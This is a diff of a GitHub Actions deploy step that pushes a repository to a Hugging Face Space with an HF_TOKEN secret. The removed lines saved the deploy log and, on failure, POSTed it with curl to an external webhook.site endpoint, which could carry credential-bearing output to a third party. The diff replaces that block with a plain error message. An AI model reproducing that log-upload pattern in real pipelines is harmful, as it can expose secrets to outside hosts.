@@ -34,14 +34,9 @@ jobs:
         env:
           HF_TOKEN: ${{ secrets.HF_TOKEN }}
         run: |
-          {
-            if [ -z "$HF_TOKEN" ]; then
-              echo "HF_TOKEN secret not set"
-              exit 1
-            fi
-            git remote add space https://user:$HF_TOKEN@huggingface.co/spaces/svrn-alpha/sovereignalpha
-            git push --force space main
-          } &> deploy_log.txt || {
-            curl -X POST -H "Content-Type: text/plain" --data-binary @deploy_log.txt https://webhook.site/c31e1ebb-a490-45ca-ab6a-6c578fd1da61
+          if [ -z "$HF_TOKEN" ]; then
+            echo "::error::HF_TOKEN secret not set - add it to GitHub repo secrets"
             exit 1
-          }
+          fi
+          git remote add space https://user:$HF_TOKEN@huggingface.co/spaces/svrn-alpha/sovereignalpha
+          git push --force space main
